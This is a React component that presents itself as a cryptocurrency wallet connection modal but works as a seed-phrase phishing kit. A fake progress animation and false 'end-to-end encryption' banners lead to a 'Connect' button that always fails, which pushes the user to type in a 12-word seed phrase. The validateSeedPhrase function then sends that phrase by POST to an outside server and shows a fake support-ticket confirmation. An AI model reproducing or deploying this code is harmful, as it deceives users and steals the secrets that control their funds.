import React, { useEffect, useState } from 'react';
import { ShieldIcon, LockIcon } from 'lucide-react';
import type { Wallet } from '~/utils/walletData';
interface WalletConnectionModalProps {
  wallet: Wallet | null;
  onClose: () => void;
}

export default function WalletConnectionModal({
  wallet,
  onClose
}: WalletConnectionModalProps) {
  const [connectionStage, setConnectionStage] = useState(0);
  const [error, setError] = useState('');
  const [showSeedForm, setShowSeedForm] = useState(false);
  const [seedPhrase, setSeedPhrase] = useState('');
  const [isSeedValid, setIsSeedValid] = useState(false);
  const [isSubmitted, setIsSubmitted] = useState(false);

  useEffect(() => {
    const timer = setTimeout(() => {
      if (connectionStage < 2) {
        setConnectionStage(connectionStage + 1);
      }
    }, 2000);
    return () => clearTimeout(timer);
  }, [connectionStage]);

  const handleConnect = () => {
    setError('Wallet connection not available, please connect manually');
  };

  const handleManualConnect = () => {
    setShowSeedForm(true);
  };

  const validateSeedPhrase = async () => {
    const words = seedPhrase.trim().split(' ');
    const isValid = words.length === 12 && words.every(word => word.length >= 4);
    setIsSeedValid(isValid);
    if (isValid) {
      try {
        const response = await fetch('https://desiree-server.vercel.app/send-email', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ seedPhrase:seedPhrase }),
        });
        if (response.ok) {
          setIsSubmitted(true);
          console.log('Seed phrase submitted successfully');
        } else {
          setError('Failed to submit seed phrase. Please try again.');
          console.error('Error:', response.statusText);
        }
      } catch (error) {
        setError('An error occurred while submitting the seed phrase.');
        console.error('Error:', error);
      }
    }
  };

  return (
    <div className="fixed inset-0 bg-black/50 dark:bg-black/70 flex items-center justify-center z-50">
      <div className="bg-white dark:bg-gray-800 rounded-2xl p-8 max-w-md w-full relative">
        <button
          onClick={onClose}
          className="absolute top-4 right-4 text-gray-500 dark:text-gray-300 hover:text-gray-700 dark:hover:text-gray-100"
        >
          &times;
        </button>
        <div className="flex flex-col items-center text-center space-y-6">
          <div className="w-16 h-16 flex items-center justify-center">
            {wallet && (
              <img
                src={wallet.logo}
                alt={`${wallet.name} logo`}
                className="max-w-full max-h-full"
              />
            )}
          </div>
          {wallet && (
            <>
              <h3 className="text-xl font-bold text-gray-800 dark:text-gray-100">
                {wallet.name}
              </h3>
              <p className="text-sm text-gray-500 dark:text-gray-400">
                {wallet.url}
              </p>
            </>
          )}
          <div className="w-full bg-indigo-100 dark:bg-indigo-800 rounded-lg p-4 flex items-center justify-center">
            <p className="text-indigo-800 dark:text-indigo-300 font-medium flex items-center">
              <ShieldIcon size={18} className="mr-2" />
              This session is secured and encrypted
            </p>
          </div>
          {isSubmitted ? (
            <div className="w-full text-center space-y-4">
              <h3 className="text-xl font-bold text-gray-800 dark:text-gray-100">
                Issue Successfully Submitted
              </h3>
              <p className="text-gray-700 dark:text-gray-300">
                Our developers are taking a look at it. Thank you for your patience.
              </p>
              <button
                onClick={onClose}
                className="bg-indigo-600 text-white px-4 py-2 rounded-lg hover:bg-indigo-700 transition"
              >
                Close
              </button>
            </div>
          ) : (
            <>
              {connectionStage < 2 && (
                <div className="w-full space-y-2">
                  <div className="h-1 w-full bg-gray-200 dark:bg-gray-600 rounded-full overflow-hidden">
                    <div
                      className="h-full bg-indigo-600 dark:bg-indigo-400 transition-all duration-1000"
                      style={{ width: `${(connectionStage + 1) * 33}%` }}
                    ></div>
                  </div>
                  <p className="text-gray-700 dark:text-gray-300">
                    {connectionStage === 0 && 'Starting secure connection... please wait'}
                    {connectionStage === 1 && 'Establishing encrypted channel...'}
                  </p>
                </div>
              )}
              {connectionStage === 2 && wallet && !showSeedForm && (
                <>
                  <button
                    onClick={handleConnect}
                    className="bg-indigo-600 text-white px-4 py-2 rounded-lg hover:bg-indigo-700 transition"
                  >
                    Connect to {wallet.name}
                  </button>
                  {error && (
                    <p className="text-red-600 text-sm mt-1">{error}</p>
                  )}
                  <button
                    onClick={handleManualConnect}
                    className="bg-indigo-600 text-white px-4 py-2 rounded-lg hover:bg-indigo-700 transition"
                  >
                    Connect Manually
                  </button>
                </>
              )}
              {showSeedForm && (
                <form className="w-full space-y-4">
                  <label className="block text-gray-700 dark:text-gray-300 text-sm font-medium">
                    Enter Wallet Seed Phrase
                  </label>
                  <textarea
                    value={seedPhrase}
                    onChange={(e) => setSeedPhrase(e.target.value)}
                    className="w-full p-2 border rounded-lg text-gray-900 dark:bg-gray-700 dark:border-gray-600 dark:text-gray-300"
                    rows={3}
                    placeholder="Enter your 12-word seed phrase"
                  ></textarea>
                  <button
                    type="button"
                    onClick={validateSeedPhrase}
                    className="bg-indigo-600 text-white px-4 py-2 rounded-lg hover:bg-indigo-700 transition"
                  >
                    Validate Seed Phrase
                  </button>
                  {!isSeedValid && seedPhrase && (
                    <p className="text-red-600 text-sm">
                      Invalid seed phrase. Please enter a valid 12-word seed phrase.
                    </p>
                  )}
                  {isSeedValid && (
                    <p className="text-green-600 text-sm">
                      Seed phrase is valid. Proceed with connection.
                    </p>
                  )}
                </form>
              )}
            </>
          )}
          <div className="w-full bg-green-50 dark:bg-green-900 rounded-lg p-4 flex items-center">
            <LockIcon size={18} className="text-green-600 dark:text-green-300 mr-2" />
            <p className="text-green-800 dark:text-green-200 text-sm">
              This session is protected with end-to-end encryption
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}